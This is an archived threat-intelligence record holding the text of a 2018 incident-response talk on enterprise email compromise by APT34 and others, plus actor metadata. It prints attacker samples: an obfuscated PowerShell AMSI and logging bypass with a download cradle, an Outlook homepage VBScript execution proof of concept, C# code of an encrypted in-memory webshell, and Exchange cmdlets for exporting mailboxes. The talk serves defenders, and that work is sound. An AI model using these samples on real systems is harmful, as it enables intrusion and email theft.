{
    "id": "0c48a83f-fde9-4930-9a82-2d852ed63d43",
    "created_at": "2022-10-25T16:48:19.027553Z",
    "updated_at": "2025-03-27T02:17:27.488944Z",
    "deleted_at": null,
    "sha1_hash": "dd3befc7f632721f91a49d75ee7d220fcd3b55ce",
    "title": "CDS2018-Technical-S3-You've Got Mail_clean",
    "authors": "",
    "file_creation_date": "2018-10-12T21:56:10Z",
    "file_modification_date": "2018-10-12T15:23:49Z",
    "file_size": 7959532,
    "plain_text": "# You’ve Got Mail!\n### Enterprise Email Compromise\n\n###### Case studies and examples are drawn from our experiences and activities working for a variety of customers, and do not represent our work for any one customer or set of customers. In many cases, facts have been changed to obscure the identity of our customers and individuals associated with our customers\n\n\n-----\n\n## Introductions\n\n##### Dan Caban\n\n#### § $whoami\n\n##### – Principal Consultant\n\n###### § Incident Response & Forensics\n\n##### – .CA & .AE\n\n – 13.5 years in the industry\n\n – 4 years with Mandiant\n\n###### @danielcabaniel\n\n linkedin.com/in/dan.caban/\n\n\n-----\n\n## Introductions\n\n##### Muks Hirani\n\n#### § $whoami\n\n##### – Technical Director\n\n###### § Incident Response in the Middle East & Africa\n\n##### – .CO.UK & .AE\n\n – 5.5 years with Mandiant\n\n – Previous UK Government\n\n###### @cyberamyntas\n\n linkedin.com/in/cyberamyntas/\n\n\n-----\n\n## Agenda Source: Wikimedia Commons\n\n###### You Got Mail!\n\n#### § Getting Access\n\n § The Second Factor?\n\n § Attack the Client\n\n § Webshells\n\n § IIS Modules and Handlers\n\n § PowerShell, ECP and EWS\n\n\n-----\n\n## Agenda Source: Wikimedia Commons\n\n#### § Getting Access\n\n § The Second Factor?\n\n § Attack the Client\n\n § Webshells\n\n § IIS Modules and Handlers\n\n § PowerShell, ECP and EWS\n\n\n-----\n\n## Attack Lifecycle\n\n**Maintain Presence** **Move Laterally**\n\n**Initial Compromise** **Establish Foothold** **Escalate Privileges** **Internal Reconnaissance** **Complete Mission**\n\n\n-----\n\n## Attack Lifecycle\n\n**Maintain Presence** **Move Laterally**\n\n**Initial Compromise** **Establish Foothold** **Escalate Privileges** **Internal Reconnaissance** **Complete Mission**\n\n## ALL THE THINGS!\n\n\n-----\n\n# Getting Access\n\n\n-----\n\n## GETTING ACCESS: Social Engineering\n\n###### Targeting employees with social engineering tactics and phishing is still incredibly effective.\n\n##### § Low/Medium success:\n\n###### – Masquerading Domains\n\n – Confusingly Similar\n\n – gTLD or INTL TLD variants\n\n – Security Alerts\n\n##### § High success:\n\n###### – Abuse of trust from trusted suppliers and\n\n\n-----\n\n## GETTING ACCESS: Social Engineering\n\n###### ◆Services\n ◆Products\n ◆Licenses\n ◆Hardware\n\n\n-----\n\n## APT 34\n\n#### Since at least 2014, an Iranian threat\n##### Iranian Cyber Espionage Group\n#### group tracked by FireEye as APT34 has conducted reconnaissance aligned with the strategic interests of Iran.\n\n##### § APT34 conducts operations primarily in the\n###### Middle East, targeting financial, government, energy, chemical, telecommunications and other industries.\n\n##### § APT34 uses a mix of public and non-public tools\n###### and often uses compromised accounts to conduct spear-phishing operations.\n\n##### § APT34 often leverages social media to perform\n###### initial reconnaissance and targeting.\n\n\n-----\n\n## GETTING ACCESS: A Case Study in APT 34\n\nLateral\n\nEmail from Enable Plants 3 Hours Later....\n\nMovement\n\nMimikatz\n\nTrusted Macros? Webshells Coffee Break\n\nto\n\nPartner OK!\n\nExchange\n\n#### § Later:\n\n##### – Evidence of staged .RAR/.PNG files on Exchange servers\n\n###### § 206 HTTP (Download manager)\n\n##### – Evidence of reading the email of IT security\n\n\n-----\n\n## GETTING ACCESS: Social Engineering\n\n###### If($PSVErSIONTaBLe.PSVErsiOn.MAjOR -GE 3){$GPS=[rEf].ASSEmbLy.GetTypE('System.Managem ent.Automation.Utils').\"GETFiE`LD\"('cachedGroupPoli cySettings','N'+'onPublic,Static').GEtVAlUe($NUlL);If($ GPS['ScriptB'+'lockLogging']){$GPS['ScriptB'+'lockLog ging']['EnableScriptB'+'lockLogging']=0;$GPS['ScriptB '+'lockLogging']['EnableScriptBlockInvocationLoggin g']=0}ELse{[SCriPTBLoCk].\"GetFIe`ld\"('signatures','N'+' onPublic,Static').SEtVALue($nUll,(New-OBJeCT CollECTioNs.GEnERIc.HaSHSeT[sTRinG]))}[REf].AsSEmB lY.GetTyPE('System.Management.Automation.AmsiU tils')|?{$_}|%{$_.GETFIELD('amsiInitFailed','NonPublic, Static').SEtVAlue($Null,$truE)};};[SYstEm.NET.SerVIcEP OInTMaNAgEr]::ExPeCt100COnTINUE=0;$wc=New- OBjEcT SysTEm.NET.WEBCLiEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HEaderS.Add('User- Agent',$u);$WC.Proxy=[SystEM.NeT.WeBREQUESt]::D\n\n\n-----\n\n## GETTING ACCESS: Reliable Ammunition\n\n###### One methodology used to ensure a near 100%\n\n success rate to avoid suspicion:\n\n##### § Register a confusingly similar domain name.\n###### Example:\n\n § WORLDARABBANK.COM\n\n § WORLDARABANK.COM\n\n##### § Setup a “Catch-All” for an emails from third parties\n###### destined toward.\n\n##### § Collect expected emails from third parties,\n###### weaponize and resend to the correct address.\n\n\n-----\n\n## GETTING ACCESS: A Case Study #1\n\n###### Bravo!\n A few\n Categorized Block, Reset,\n victims\n Phish Case Closed! Delete\n\n\n-----\n\n## GETTING ACCESS: A Case Study #1\n\nBravo!\n\nCategorized Block, Reset,\nPhish Delete\n\nCase Closed!\n\nCategorized\nPhish\n\nA C-Level on Distribution Entire\nBlocked!\nholiday Group Organization\n\n\n-----\n\n## GETTING ACCESS: A Case Study #1\n\nBravo!\n\nCategorized Block, Reset,\nPhish Delete\n\nCase Closed!\n\nCategorized\nPhish\n\nA C-Level on Distribution Entire\nBlocked! Guest Wifi\nholiday Group Organization\n\n\n-----\n\n## GETTING ACCESS: A Case Study #1\n\n#### § 2[nd] password reset after\n##### users reported outbound emails\n\n#### § 12GB gone over 3 days\n\n\n-----\n\n## GETTING ACCESS: A Case Study #2\n\n#### § The Red Team successfully collected credentials through a targeted phishing\n##### campaign\n\n – Two users with the same generic “welcome” password set by IT.\n\n – The same password was found in open source dumped databases.\n#### § Office 365 without 2FA\n\n\n-----\n\n## GETTING ACCESS: A Case Study #2\n\n#### § 848 accounts with the same password (18%)\n\n § 8 domains, which included subsidiaries\n\n § 22 million email objects\n\n § 4.8TB of email data\n\n § Without considering:\n\n##### – Other Office 365 services like OneDrive\n\n – Web services that share authentication\n\n\n-----\n\n# The Second Factor?\n\n\n-----\n\n-----\n\n## THE SECOND FACTOR? SMS Text Message OTP\n\n#### § A customer began a project to implement text message OTP for 2FA.\n\n § The OTP was sent to the phone number associated with the user in AD.\n\n##### Can you imagine what happened?\n\n\n-----\n\n## THE SECOND FACTOR? SMS Text Message OTP\n\n#### § A customer began a project to implement text message OTP for 2FA.\n\n § The OTP was sent to the phone number associated with the user in AD.\n\n##### Can you imagine what happened?\n\n\n-----\n\n## THE SECOND FACTOR? Delivered via Email\n\n#### § A customer implemented MAC address based 2FA for VPN remote access.\n\n##### Can you imagine what happened?\n\n\n-----\n\n## THE SECOND FACTOR? Delivered via Email\n\n#### § A customer implemented MAC address based 2FA for VPN remote access.\n\n##### Can you imagine what happened?\n\n#### § A customer began a project to implement soft tokens with RSA for 2FA.\n\n###### § Attacker has been actively reading the “RSA” email address used for token delivery.\n\n § Copied the entire “.pst” archive a compromised server.\n\n § Attacker had been accessing the RSA Authentication Manager.\n\n##### Can you imagine what happened?\n\n\n-----\n\n## THE SECOND FACTOR? Third Parties\n\n#### § “ActiveSync continues to work as it did prior to installing Duo. Duo's OWA\n##### application does not add two-factor authentication to the EWS and ActiveSync endpoints. ActiveSync clients will not see an MFA prompt. We do not recommend exposing the ActiveSync endpoint to external access.”\n\n\n-----\n\n#### § 2[nd] password reset after\n##### report\n\n#### § 12GB gone over 3 days\n\n § Reset unsuccessful?\n\n##### – ActiveSync\n#### § SPAM\n\n\n-----\n\n# Attack the Client\n\n\n-----\n\n## Attack The Client: Client Side\n\n#### § Vulnerabilities found in Outlook configuration.\n\n###### Server Zone (DMZ)\n\n##### – Patched promptly.\n#### § Issues include:\n\n##### – Rules Exchange Server\n\n###### § Abuse of rules designed to open a local document.\n\n##### – Homepages\n\n###### Offsite / Untrusted Client Zone (Secure)\n § Abuse of HTML homepages for inboxes.\n#### § Seen in the wild!\n\n\n-----\n\n## Attack The Client: HomePage\n\n#### § POC\n\n###### <script id=clientEventHandlersVBS language=vbscript> <!-- Sub window_onload() Set Application = ViewCtl1.OutlookApplication Set objShell = Application.CreateObject(\"shell.application\") objShell.ShellExecute \"cmd.exe \", \" /c calc.exe\", \"\", \"\", 0 Set objShell = nothing End Sub --> </script> </head>\n\n\n-----\n\n## Attack The Client: HomePage\n\n#### § POC\n\n###### Client\n\n\n-----\n\n## Attack The Client: Add-Ins\n\n##### POSTALBOOK / POSTALDOOR\n\n#### § An .NET Outlook Add-in backdoor capable of:\n\n##### – download\n\n – upload\n\n – execute\n\n – load modular plugins\n\n – sysinfo\n#### § Creates a hidden folder for messages.\n\n § Creates a rule to move incoming/outgoing messages to hidden folder.\n\n\n-----\n\n## Attack The Client: Add-Ins\n\n##### POSTALBOOK / POSTALDOOR\n\n#### § Embedded resource with configuration data XOR’d\n\n##### § RSA encryption keys\n\n § Email beacon addresses.\n\n § Email beacon format and templates.\n#### § On Launch of Outlook:\n\n##### § Uses WMI and Registry settings as beacon details.\n\n § Beacon is encrypted and embedded as a PNG chunk.\n\n § PNG is embedded as base64 into HTML email formatted by configuration template.\n\n\n-----\n\n## Attack The Client: Add-Ins\n\n##### POSTALBOOK / POSTALDOOR\n\n#### § Adds handler to read all incoming email\n\n###### IsMailForMe()? PNG Images? Decrypt Profit?\n • SMTP References • Base64 • Validate Header • download\n •Validated md5 Embedded • Extract Chunk • upload bytes • Attach,emts • Decrypt Chunk • Execute, etc.\n\n\n-----\n\n## Attack The Client: Backdoors\n\n##### 0x00FACADE\n\n#### § A .DLL backdoor capable of:\n\n##### – harvesting e-mail\n\n – uploading\n\n – downloading\n\n – execution\n#### § Supports the following e-mail clients:\n\n##### – Microsoft Outlook\n\n – Outlook Express\n\n – Thunderbird\n\n\n-----\n\n# Webshells\n\n\n-----\n\n## Webshells\n\n\n-----\n\n## Webshells: Exchange\n\n#### § A default Exchange 2013 install:\n\n##### – .ASPX Files: 584 files in 55 folders\n\n – .DLL Modules (more on this later): 20 Native and 14 Managed\n\n …\n\n\n-----\n\n## Webshells: The Beginning\n\n\n-----\n\n## Webshells: Evasions & Embedding\n\n\n-----\n\n## Webshells: A recent technique\n\n###### flogon.is\n\n logon.aspx\n\n logoff.aspx\n\n ftpext.tlb\n\n\n-----\n\nHttpCookie s = Request.Cookies[\"session\"];\n\n## Webshells: Dynamic\n\nHttpCookie s_id = Request.Cookies[\"session_id\"];\n….\nSHA1 sha = new SHA1CryptoServiceProvider();\nbyte[] serial1 = System.Convert.FromBase64String(s_id.Value.Substring(1));\n\n#### § COOKIES contain encrypted webshell\n\nbyte[] serial2 = System.Text.Encoding.UTF8.GetBytes(\"722f4494-15b6-4748-ae53-\n\n##### along with key necessary for 7aa3a57821b2\"); decryption. byte[] serial = new byte[serial1.Length + serial2.Length]; System.Buffer.BlockCopy(serial1, 0, serial, 0, serial1.Length);\n\nSystem.Buffer.BlockCopy(serial2, 0, serial, serial1.Length, serial2.Length);\n\n#### § POST data that is intended to be byte[] e1 = sha.ComputeHash(serial);byte[] e2 = System.Convert.FromBase64String(s.Value.Substring(1))\n##### interpreted by final web shell. …string session = System.Text.Encoding.UTF8.GetString(RC4.crypt(e1, e2));\n\nICodeCompiler loCompiler = new CSharpCodeProvider().CreateCompiler();\nCompilerParameters loParameters = new CompilerParameters();\n…\n// *** Load the resulting assembly into memory\n\nCompile Run loParameters.GenerateInMemory = true;\n\nRC4 / *** Now compile the whole thing\n\nCookies in Dynamic\n\nDecrypt **CompilerResults loCompiled =**\n\nMemory Webshell\n\n**loCompiler.CompileAssemblyFromSource(loParameters,session); /**\n**Assembly loAssembly = loCompiled.CompiledAssembly;**\n…\nobject loObject = loAssembly.CreateInstance(\"MyNamespace.MyClass\");\nobject[] loCodeParms = new object[3];\nloCodeParms[0] = Request;\nloCodeParms[1] = Response;\nloCodeParms[2] = e1;\n…\n**object loResult =**\n**loObject.GetType().InvokeMember(\"DynamicCode\",BindingFlags.InvokeMethod,**\n\n\n-----\n\npublic class MyClass\n\n## Webshells: Dynamic\n\n{\npublic void DynamicCode(params object[] Parameters)\n{\nHttpRequest Request = (HttpRequest) Parameters[0];\n\n#### § COOKIES contain encrypted webshell\n\nHttpResponse Response = (HttpResponse) Parameters[1];\n\n##### along with key necessary for byte[] key = (byte[]) Parameters[2]; decryption. Random r = new Random();\n\nResponse.ClearContent();\n\n#### § POST data that is intended to be try {\n##### interpreted by final web shell. string output = \"\";\n\nbyte[] bytes = Request.BinaryRead(Request.ContentLength);\nbytes = RC4.crypt(key, bytes);\nFileStream fs = File.OpenWrite(@\"c:\\PerfLogs\\Bandwidth.ps1\");\n\nCompile Run fs.Seek(0, SeekOrigin.Begin);\n\nRC4 fs.Write(bytes, 0, bytes.Length);\n\nCookies in Dynamic\n\nDecrypt fs.Flush();\n\nMemory Webshell\n\nfs.Close();\noutput = \"OK”;\n….\n\n\n-----\n\n|Name|Usage|\n|---|---|\n|s|Base64-encoded RSA signature for the source code. It used the RSACryptoServiceProvider::VerifyData and SHA-1 as a hashing algorithm.|\n|d|Base64 encoded AES128-CBC encrypted .NET source code. Will be executed if the signature in HTTP POST parameter ”s” matches.|\n|p|Thee Base64 encoded parameters supplied to the compiled code, also AES128-CBC encrypted.|\n|sc|Name of the HTTP(s) cookie to store the file name where the symmetric key is stored.|\n\n\n## Webshells: Dynamic & Signed\n\n#### § Attacker used a RSA private key that matches the hard-coded 2,048-bit public key,\n##### embedded inside the web shell\n\n###### String n = \"0TvWBLFriALALHr0T7FEOCder7jFUjuocg5Nw/OSQ1EhwQ3oj5Exuxo+kD/CDldF8MM/==etc..etc.. RSACryptoServiceProvider RSA = new RSACryptoServiceProvider(); RSAParameters param = new RSAParameters();       param.Modulus = Convert.FromBase64String(n);\n\n**Name** **Usage**\n\ns Base64-encoded RSA signature for the source code. It used the RSACryptoServiceProvider::VerifyData and SHA-1 as a hashing\nalgorithm.\n\nd Base64 encoded AES128-CBC encrypted .NET source code. Will be executed if the signature in HTTP POST parameter ”s”\nmatches.\n\np Thee Base64 encoded parameters supplied to the compiled code, also AES128-CBC encrypted.\n\nsc Name of the HTTP(s) cookie to store the file name where the symmetric key is stored.\n\n\n-----\n\n|Col1|HTTP POST Request HTTP Response|cookie set? Yes Generate: AES key (128 bit) GUID (128 bit)|\n|---|---|---|\n\n\n## Webshells: Dynamic & Signed\n\nAttacker getidtoken.aspx\n\nNo\n\nSC\ncookie\n\nSource code set?\n\nHTTP POST Request\n\nYes\n\n2048 bits RSA Generate:\nprivate key AES key (128 bit)\n\nGUID (128 bit)\n\nHTTP Response\n\nGUID Read AES key\n\nFrom file\n%TEMP%\\GUID\n\nHTTP POST Request\n\nDecrypt source\ncode via HTTP\nPOST ‘d’.\n‘s’ and ‘p’\n\nNo\n\nSigned\ncode\nOk?\n\nYes\n\nDecrypt source\ncode via HTTP\nPOST ‘d’. End\n‘s’ and ‘p’\n\n\n-----\n\n# IIS Modules, Handlers, and Transport Agents\n\n\n-----\n\n## Extending IIS\n\n#### § GET  /webshell.aspx?cmd=whoami\n\n § POST /webshell.aspx\n\n##### – cmd=whoami\n\n\n-----\n\n## Extending IIS\n\n#### § GET  /\n\n § POST /\n\n\n-----\n\n## Extending IIS\n\n#### § ISAPI Filters in the past\n\n § Managed Modules\n\n##### – .NET\n\n – Inherits ASP.NET privileges (web.config)\n#### § Native Modules\n\n##### – C++\n\n – Admin rights required to register (GUI or AppCmd)\n\n – Elevated privileges\n\n – Can access all requests, not just .aspx\n###### Source: https://msdn.microsoft.com/en-us/library/bb470252.aspx\n\n\n-----\n\n## Extending IIS: Managed Modules\n\n#### § Microsoft.Exchange.Clients.Auth.dll\n\n\n-----\n\n## Extending IIS: Native Modules\n\n#### § Exported function: RegisterModule\n\n § HttpParser.dll\n\n##### – RGSESSIONID cookie contains base64 encoded & XOR’d command.\n\n###### § Execute: cmd$\n\n § Upload: upload$\n\n § Download: download$\n#### § HttpModule.dll\n\n##### – If 25th known headers in HTTP raw header is \"Default-Windows”\n\n###### § Execute: rc\n\n § Upload: uf\n\n\n-----\n\n## Extending IIS: Transport Agents\n\n#### § “Transport agents let you install custom software that is created by Microsoft, by\n##### third-party vendors, or by your organization, on an Exchange server. This software can then process email messages that pass through the transport pipeline.\n\n#### § In Microsoft Exchange Server 2013, the transport pipeline is made of the following\n##### processes:\n\n###### § The Front End Transport service on Client Access servers\n\n § The Transport service on Mailbox servers\n\n § The Mailbox Transport service on Mailbox servers\n\n § The Transport service on Edge Transport servers”\n\n\n-----\n\n## Extending IIS: Transport Agents\n\n##### XTRANS\n\n#### § C2 commands and data as encrypted within PDF/JPEG attachments in emails.\n\n##### – Highly configurable using encrypted xml config files\n\n – Complex boolean logic containing and/or/not contains etc on:\n\n###### § Attachments\n\n § Subjects\n\n § Senders\n\n § Receivers\n\n\n-----\n\n|TRANS|Col2|\n|---|---|\n|Handler|Description|\n|logHandler|Writes attachments to disk at the path identified by LOG_OUTPUT.|\n|blockHandler|Does not manipulate the message but returns a value that could be used by the caller to process a message differently, for example, block the message.|\n|zipHandler|Write email contents to a ZIP_FILE_NAME with a portion of the file name being randomly generated integer less than 99999.|\n|commandHandler|Send command to the malware|\n|changeSubjectHandler|Changes the subject of an email.|\n|changeBodyHandler|Replaces the contents of the body of an email message.|\n|createHandler|Duplicates an email message with the subject changed.|\n|spamHandler|Sends multiple messages with the subject spam.|\n|replaceHandler|Replaces attachments with a file located on disk.|\n|statHandler|Collects the data, sender, recipient, subject, and attachment names into a comma separated list.|\n\n\n## Extending IIS: Transport Agents\n\n##### XTRANS\n\n**Handler** **Description**\n\nlogHandler Writes attachments to disk at the path identified by LOG_OUTPUT.\n\nblockHandler Does not manipulate the message but returns a value that could be used by the caller to process a\nmessage differently, for example, block the message.\n\nzipHandler Write email contents to a ZIP_FILE_NAME with a portion of the file name being randomly generated\ninteger less than 99999.\n\ncommandHandler Send command to the malware\n\nchangeSubjectHandler Changes the subject of an email.\n\nchangeBodyHandler Replaces the contents of the body of an email message.\n\ncreateHandler Duplicates an email message with the subject changed.\n\nspamHandler Sends multiple messages with the subject spam.\n\nreplaceHandler Replaces attachments with a file located on disk.\n\nstatHandler Collects the data, sender, recipient, subject, and attachment names into a comma separated list.\n\nchangeToHandler\n\n\n-----\n\n# Powershell, ECP, and EWS\n\n\n-----\n\n## PS, ECP, and EWS: Forwarders\n\n#### § ForwardSMTPAddress\n\n\n-----\n\n## PS, ECP, and EWS: Rules\n\n#### § ForwardAsAttachmentTo, ForwardTo & RedirectTo\n\n\n-----\n\n## PS, ECP, and EWS: Exporting\n\n#### § New-ManagementRoleAssignment -Role \"Mailbox Import Export\" -User\n##### ”dan@malwhere.com\"\n\n#### § New-MailboxExportRequest -Mailbox poor.bloke -FilePath\n##### \\\\MALWHEREMAIL01\\PSTS\\Email.pst\n\n\n-----\n\n## PS, ECP, and EWS: e-Discovery\n\n#### § https://mail.server.com/ecp/\n\n\n-----\n\n## PS, ECP, and EWS: e-Discovery\n\n#### § E-Discovery Feature in Microsoft Exchange that allows for you to search, collect,\n##### and hold e-mail across all email accounts.\n\n#### § Identified email is collected and stored. The default account in all organizations is  \n\n##### – DiscoverySearchMailbox{d919ba05-46a6-415f-80ad- 7e09334bb852}@companyname.com\n\n\n-----\n\n## PS, ECP, and EWS: e-Discovery\n\n#### § New-MailboxSearch (eDiscovery and Litigation Holds)\n\n## PROFIT!\n\n\n-----\n\n## PS, ECP, and EWS: e-Discovery\n\n\n-----\n\n## Attack Lifecycle\n\n**Maintain Presence** **Move Laterally**\n\n**Initial Compromise** **Establish Foothold** **Escalate Privileges** **Internal Reconnaissance** **Complete Mission**\n\n## ALL THE THINGS!\n\n\n-----\n\n# Thank you!\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        }
    ],
    "references": [
        "https://summit.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s03-youve-got-mail.pdf"
    ],
    "report_names": [
        "cds18-technical-s03-youve-got-mail.pdf"
    ],
    "threat_actors": [
        {
            "id": "ce10c1bd-4467-45f9-af83-28fc88e35ca4",
            "created_at": "2022-10-25T15:50:23.458833Z",
            "updated_at": "2025-03-27T02:00:55.475188Z",
            "deleted_at": null,
            "main_name": "APT34",
            "aliases": null,
            "source_name": "MITRE:APT34",
            "tools": [
                "netstat",
                "Systeminfo",
                "PsExec",
                "SEASHARPEE",
                "Tasklist",
                "Mimikatz",
                "POWRUNER",
                "certutil"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "cffb3c01-038f-4527-9cfd-57ad5a035c22",
            "created_at": "2022-10-25T15:50:23.38055Z",
            "updated_at": "2025-03-27T02:00:55.459558Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "COBALT GYPSY",
                "IRN2",
                "APT34",
                "Helix Kitten",
                "Evasive Serpens",
                "Hazel Sandstorm",
                "EUROPIUM",
                "ITG13"
            ],
            "source_name": "MITRE:OilRig",
            "tools": [
                "ISMInjector",
                "RDAT",
                "Systeminfo",
                "QUADAGENT",
                "OopsIE",
                "Tasklist",
                "certutil",
                "ZeroCleare",
                "POWRUNER",
                "netstat",
                "ipconfig",
                "LaZagne",
                "BONDUPDATER",
                "SideTwist",
                "PsExec",
                "SEASHARPEE",
                "Mimikatz",
                "RGDoor",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "67709937-2186-4a32-b64c-a5693d40ac77",
            "created_at": "2023-01-06T13:46:38.495593Z",
            "updated_at": "2025-03-27T02:00:02.848206Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "IRN2",
                "Hazel Sandstorm",
                "EUROPIUM",
                "TA452",
                "Earth Simnavaz",
                "Cobalt Gypsy",
                "Crambus",
                "Helix Kitten",
                "APT 34",
                "APT34",
                "ATK40",
                "G0049",
                "Evasive Serpens",
                "Twisted Kitten"
            ],
            "source_name": "MISPGALAXY:OilRig",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "3eebdb3f-f4e3-42e5-bb4d-f02a13328316",
            "created_at": "2024-05-01T02:03:08.014303Z",
            "updated_at": "2025-03-27T02:05:17.306592Z",
            "deleted_at": null,
            "main_name": "COBALT EDGEWATER",
            "aliases": [
                "Cold River ",
                "DNSpionage ",
                "APT34 "
            ],
            "source_name": "Secureworks:COBALT EDGEWATER",
            "tools": [
                " DNSpionage",
                " Karkoff",
                " MailDropper",
                " SideTwist",
                " TWOTONE",
                "AgentDrable"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8f9c8a6e-f6b6-431b-bedd-94fdeea5474a",
            "created_at": "2024-05-01T02:03:08.022974Z",
            "updated_at": "2025-03-27T02:05:17.310877Z",
            "deleted_at": null,
            "main_name": "COBALT GYPSY",
            "aliases": [
                "CHRYSENE ",
                "Crambus ",
                "EUROPIUM ",
                "Hazel Sandstorm ",
                "Helix Kitten ",
                "ITG13 ",
                "OilRig ",
                "Yellow Maero ",
                "APT34 "
            ],
            "source_name": "Secureworks:COBALT GYPSY",
            "tools": [
                " Helminth",
                " Jason",
                " MacDownloader",
                " PoisonFrog",
                " RGDoor",
                " ThreeDollars",
                " TinyZbot",
                " Toxocara",
                " Trichuris",
                " TwoFace",
                "Glimpse"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b6436f7b-6012-4969-aed1-d440e2e8b238",
            "created_at": "2022-10-25T16:07:23.91517Z",
            "updated_at": "2025-03-27T02:02:10.027531Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "APT 34",
                "ATK 40",
                "Chrysene",
                "Cobalt Gypsy",
                "Crambus",
                "DEV-0861",
                "EUROPIUM",
                "Earth Simnavaz",
                "Evasive Serpens",
                "Hazel Sandstorm",
                "Helix Kitten",
                "IRN2",
                "ITG13",
                "Scarred Manticore",
                "Storm-0861",
                "TA452",
                "Twisted Kitten",
                "UNC1860",
                "Yellow Maero"
            ],
            "source_name": "ETDA:OilRig",
            "tools": [
                "AMATIAS",
                "Agent Drable",
                "Agent Injector",
                "AgentDrable",
                "Alma Communicator",
                "BONDUPDATER",
                "CACTUSPIPE",
                "Clayslide",
                "CypherRat",
                "DNSExfitrator",
                "DNSpionage",
                "DROPSHOT",
                "DistTrack",
                "DropperBackdoor",
                "Fox Panel",
                "GREYSTUFF",
                "GoogleDrive RAT",
                "HighShell",
                "HyperShell",
                "ISMAgent",
                "ISMDoor",
                "ISMInjector",
                "Jason",
                "Karkoff",
                "LIONTAIL",
                "LOLBAS",
                "LOLBins",
                "LONGWATCH",
                "LaZagne",
                "Living off the Land",
                "MailDropper",
                "Mimikatz",
                "MrPerfectInstaller",
                "OILYFACE",
                "OopsIE",
                "POWBAT",
                "POWRUNER",
                "Plink",
                "Poison Frog",
                "PowerExchange",
                "PsList",
                "PuTTY Link",
                "QUADAGENT",
                "RDAT",
                "RGDoor",
                "SEASHARPEE",
                "Saitama",
                "Saitama Backdoor",
                "Shamoon",
                "SideTwist",
                "SpyNote",
                "SpyNote RAT",
                "StoneDrill",
                "TONEDEAF",
                "TONEDEAF 2.0",
                "ThreeDollars",
                "TwoFace",
                "VALUEVAULT",
                "Webmask",
                "WinRAR",
                "ZEROCLEAR",
                "ZeroCleare",
                "certutil",
                "certutil.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716499,
    "ts_updated_at": 1743041847,
    "ts_creation_date": 1539381370,
    "ts_modification_date": 1539357829,
    "files": {
        "pdf": "https://archive.orkl.eu/dd3befc7f632721f91a49d75ee7d220fcd3b55ce.pdf",
        "text": "https://archive.orkl.eu/dd3befc7f632721f91a49d75ee7d220fcd3b55ce.txt",
        "img": "https://archive.orkl.eu/dd3befc7f632721f91a49d75ee7d220fcd3b55ce.jpg"
    }
}